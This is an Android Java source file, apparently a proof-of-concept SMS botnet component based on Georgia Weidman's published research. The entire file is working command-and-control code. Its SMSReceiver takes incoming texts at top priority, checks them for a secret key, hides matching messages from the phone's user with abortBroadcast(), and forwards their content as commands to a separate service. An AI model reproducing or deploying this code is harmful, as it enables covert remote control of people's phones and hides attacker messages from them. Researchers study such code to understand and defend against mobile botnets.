package com.bot.bottest;

// This code based on Georgia Weidman's - all credit to her
// http://georgiaweidman.com/wordpress/application-layer-botnet-port/
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

// Receives an SMS message - has max priority, so always gets it first
public class SMSReceiver extends BroadcastReceiver {
	public static final int DEFAULT_CMD_LENGTH = 4;
	
	@Override
	public void onReceive(Context arg0, Intent arg1) {
		Bundle bundle = arg1.getExtras();
		SmsMessage[] msgs = null;
		String key = "key"; // Secret key to look for
		int keylen = key.length();
		if (bundle != null) {
			Object[] pdus = (Object[]) bundle.get("pdus");
			msgs = new SmsMessage[pdus.length];
			for (int i = 0; i < msgs.length; i++) {
				msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);	
				String body = msgs[i].getMessageBody().toString();
				if (body.length() >= (keylen + 1 + DEFAULT_CMD_LENGTH)) {
					String checkkey = body.substring(0, keylen); // Check the key
					if (checkkey.equalsIgnoreCase(key)) {
						this.abortBroadcast();
						Intent proxy = new Intent(arg0, Splice.class); // Prepare intent
						proxy.putExtra("message",body);
						proxy.putExtra("keylen", keylen);
						arg0.startService(proxy); // Let's roll
					} // End checkkey if
				} // End bodylength if
			} // End for
		} // End bundle if
	} // End onReceive()
} // End SMSReceiver class
